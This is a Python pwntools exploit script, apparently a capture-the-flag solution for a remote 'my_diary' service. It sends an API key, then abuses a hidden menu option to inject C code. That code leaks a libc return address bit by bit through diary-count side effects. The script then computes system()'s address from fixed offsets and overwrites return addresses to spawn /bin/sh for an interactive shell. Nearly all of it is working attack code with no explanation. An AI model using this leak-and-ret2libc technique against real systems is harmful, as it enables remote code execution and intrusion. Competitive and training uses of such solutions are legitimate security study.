import json
import re

from pwn import *

p = remote('my_diary.eatpwnnosleep.com', 18879)

a = {
    'apikey': 'aaca14463ad73872670c933a647bdf62c249d378ef8fc3b713129f08e38c3f33',
}

p.send(json.dumps(a))


def write_diary(title, date, content):
    p.recvuntil('delete diary\n')
    p.sendline('1')
    p.recvuntil('title: ')
    p.sendline(title)
    p.recvuntil('date: ')
    p.sendline(date)
    p.recvuntil('"</end>")\n')
    p.sendline(content)
    p.sendline('</end>')


def read_number():
    p.recvuntil('delete diary\n')
    p.sendline('2')
    txt = p.recvuntil('Diary service')
    return sum(map(int, re.findall('title: diary_(\d+)', txt)))


def leak(index):
    p.recvuntil('delete diary\n')
    p.sendline('4919')
    p.recvuntil('1;\n')

    p.sendline('''
unsigned long long val;
unsigned long long a[1];
val = {};
if(val >>  0 & 0xFF & ~arg[0]) return 1;
if(val >>  8 & 0xFF & ~arg[1]) return 1;
if(val >> 16 & 0xFF & ~arg[2]) return 1;
if(val >> 24 & 0xFF & ~arg[3]) return 1;
if(val >> 32 & 0xFF & ~arg[4]) return 1;
if(val >> 40 & 0xFF & ~arg[5]) return 1;
if(val >> 48 & 0xFF & ~arg[6]) return 1;
if(val >> 56 & 0xFF & ~arg[7]) return 1;
return 0;
    '''.format(index).replace('\n', ''))

    return read_number()


def ret(addr):
    p.recvuntil('delete diary\n')
    p.sendline('4919')
    p.recvuntil('1;\n')

    p.sendline('''
unsigned long long a[1];
a[2] = {0}ll;
a[3] = {0}ll;
a[4] = {0}ll;
a[5] = {0}ll;
a[6] = {0}ll;
a[7] = {0}ll;
return 0;
    '''.format(str(addr)).replace('\n', ''))

    p.recvuntil('delete diary\n')
    p.sendline('2')

g = log.progress('Sending ')
for i in range(64):
    g.status('%d/64' % (i+1))
    diary_name = 'diary_%s' % str(1 << i)
    write_diary(diary_name, diary_name, p64(0xFFFFFFFFFFFFFFFF ^ (1 << i))+' '+str(1 << i))
g.success('done')

# libc_start_main_ret
# a[47] = 7fe5b61c3830
libc_start_main_ret = leak('a[47]')
log.success('libc_start_main_ret: %x' % libc_start_main_ret)

system_addr = libc_start_main_ret - 0x20830 + 0x45390

write_diary('system', 'system', '/bin/sh')

ret(system_addr)

p.interactive()
